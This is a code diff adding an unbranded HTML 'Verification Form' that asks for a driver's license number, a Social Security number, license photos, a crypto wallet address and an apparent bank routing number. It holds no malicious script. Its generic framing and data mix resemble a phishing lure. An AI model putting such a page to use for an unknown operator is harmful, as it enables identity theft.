@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification Form</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #6b46c1, #4c51bf, #319795);
+      color: #fff;
+    }
+    .form-container {
+      background: #fff;
+      border-radius: 10px;
+      padding: 2rem;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      color: #333;
+    }
+    .form-container h2 {
+      color: #6b46c1;
+      font-weight: bold;
+    }
+    .form-control:focus {
+      border-color: #6b46c1;
+      box-shadow: 0 0 0 0.2rem rgba(107, 70, 193, 0.25);
+    }
+    .btn-primary {
+      background-color: #6b46c1;
+      border-color: #6b46c1;
+    }
+    .btn-primary:hover {
+      background-color: #553c9a;
+      border-color: #553c9a;
+    }
+    .upload-preview {
+      border: 2px dashed #6b46c1;
+      border-radius: 10px;
+      padding: 1rem;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    .upload-preview img {
+      max-width: 100%;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container py-5">
+    <div class="row justify-content-center">
+      <div class="col-md-8">
+        <div class="form-container">
+          <h2 class="text-center mb-4">Verification Form</h2>
+          <form>
+            <!-- Driver's License Section -->
+            <div class="mb-4">
+              <label for="dlNumber" class="form-label">Driver's License Number</label>
+              <input type="text" class="form-control" id="dlNumber" placeholder="Enter DL Number" required>
+            </div>
+
+            <!-- SSN Section -->
+            <div class="mb-4">
+              <label for="ssn" class="form-label">Social Security Number (SSN)</label>
+              <input type="text" class="form-control" id="ssn" placeholder="Enter SSN" required>
+            </div>
+
+            <!-- Upload DL Front and Back -->
+            <div class="mb-4">
+              <label class="form-label">Upload Driver's License</label>
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="upload-preview">
+                    <img id="frontPreview" src="#" alt="Front Preview" style="display: none;">
+                    <p id="frontText">Front of DL</p>
+                  </div>
+                  <input type="file" class="form-control" id="frontUpload" accept="image/*" onchange="previewImage(event, 'frontPreview', 'frontText')">
+                </div>
+                <div class="col-md-6">
+                  <div class="upload-preview">
+                    <img id="backPreview" src="#" alt="Back Preview" style="display: none;">
+                    <p id="backText">Back of DL</p>
+                  </div>
+                  <input type="file" class="form-control" id="backUpload" accept="image/*" onchange="previewImage(event, 'backPreview', 'backText')">
+                </div>
+              </div>
+            </div>
+
+            <!-- Wallet Address Section -->
+            <div class="mb-4">
+              <label for="walletType" class="form-label">Select Wallet Type</label>
+              <select class="form-select" id="walletType" required>
+                <option value="">Choose...</option>
+                <option value="bitcoin">Bitcoin</option>
+                <option value="ethereum">Ethereum</option>
+                <option value="usdt">USDT (Tether)</option>
+                <option value="other">Other</option>
+              </select>
+            </div>
+            <div class="mb-4">
+              <label for="walletAddress" class="form-label">Wallet Address</label>
+              <input type="text" class="form-control" id="walletAddress" placeholder="Enter Wallet Address" required>
+            </div>
+
+            <!-- Form Routine Number -->
+            <div class="mb-4">
+              <label for="routineNumber" class="form-label">Form Routine Number</label>
+              <input type="text" class="form-control" id="routineNumber" placeholder="Enter Routine Number" required>
+            </div>
+
+            <!-- Yes/No Questions -->
+            <div class="mb-4">
+              <label class="form-label">Are you a U.S. citizen?</label>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="citizen" id="citizenYes" value="yes" required>
+                <label class="form-check-label" for="citizenYes">Yes</label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="citizen" id="citizenNo" value="no" required>
+                <label class="form-check-label" for="citizenNo">No</label>
+              </div>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="d-grid">
+              <button type="submit" class="btn btn-primary">Submit Verification</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function previewImage(event, imgId, textId) {
+      const file = event.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          const img = document.getElementById(imgId);
+          img.src = e.target.result;
+          img.style.display = 'block';
+          document.getElementById(textId).style.display = 'none';
+        };
+        reader.readAsDataURL(file);
+      }
+    }
+  </script>
+</body>
+</html>
